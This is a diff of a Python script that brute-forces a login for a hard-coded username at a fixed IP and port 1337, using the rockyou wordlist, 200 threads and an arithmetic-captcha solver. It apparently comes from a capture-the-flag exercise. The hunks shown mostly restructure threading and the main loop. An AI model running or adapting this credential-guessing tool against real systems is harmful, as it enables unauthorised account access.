@@ -8,31 +8,46 @@ host = "157.230.179.99" # IP address here
 port = 1337 # Port here
 wordlist = "/usr/share/wordlists/rockyou.txt" # Point to wordlist file
 
+username = "ejnorman84"
+regex = r"(?P<firstNum>(\d)*)\s(?P<op>([\+\-\*\/]))\s(?P<secNum>(\d)*)"
+ops = { "+": operator.add, "-": operator.sub, "*": operator.mul, "/": operator.floordiv }
+pw_find = False
 
-def create_threads(passwords,thread_num):
-	p_len = len(passwords)
-	t_len = p_len//thread_num
-	split_points = []
-	for n in range(thread_num):
-		if n == thread_num-1:
-			split_points.append((n*t_len,p_len-1))
-		else:
-			split_points.append((n*t_len,(n+1)*t_len-1))
+# def create_threads(passwords,thread_num):
+# 	p_len = len(passwords)
+# 	t_len = p_len//thread_num
+# 	split_points = []
+# 	for n in range(thread_num):
+# 		if n == thread_num-1:
+# 			split_points.append((n*t_len,p_len-1))
+# 		else:
+# 			split_points.append((n*t_len,(n+1)*t_len-1))
 
-	print(p_len)
-	print("=====")
-	print(split_points)
+# 	print(p_len)
+# 	print("=====")
+# 	print(split_points)
 
 
-	thread_list = [threading.Thread(target=run_brute_force,
-		args=(
-            passwords[split_point[0] : split_point[1]]
-        )
-    ) for split_point in split_points]
+# 	thread_list = [threading.Thread(target=run_brute_force,
+# 		args=(
+#             passwords[split_point[0] : split_point[1]]
+#         )
+#     ) for split_point in split_points]
 
-	return thread_list
+# 	return thread_list
+def create_threads(t, passwords):
+	n = len(passwords)
+	x = n // t
+	m = n % t 
+	xs = [passwords[i:i+x] for i in range(0, n, x)]
+	if m:
+		xs[t-1:] = [passwords[-m-x:]]
+	assert(sum([len(l) for l in xs]) == n)
+	return [
+		threading.Thread(target=run_brute_force, args=(l)) for l in xs
+	]
 
-def run_brute_force(passwords):
+def run_brute_force(*passwords):
 	global pw_find
 
 	for pw in passwords:
@@ -43,11 +58,6 @@ def run_brute_force(passwords):
 				pw_find = True
 
 def brute_force(pw):
-	file = open(wordlist,"r")
-	username = "ejnorman84"
-	regex = r"(?P<firstNum>(\d)*)\s(?P<op>([\+\-\*\/]))\s(?P<secNum>(\d)*)"
-	ops = { "+": operator.add, "-": operator.sub, "*": operator.mul, "/": operator.floordiv }
-
 
 	print(" Trying Passowrd: " + pw)
 
@@ -101,5 +111,17 @@ def brute_force(pw):
 		
 
 if __name__ == '__main__':
+	file = open(wordlist,"r")
+	passwords = file.readlines()
+
+	thread_list = create_threads(200,passwords)
+
+	for thread in thread_list:
+		print('[*] Running thread: {}.'.format(thread.getName()))
+		thread.start()
+
+	for thread in thread_list:
+		print('[*] Wating for {} to join.'.format(thread.getName()))
+		thread.join()
 	
-	 brute_force("233")
+
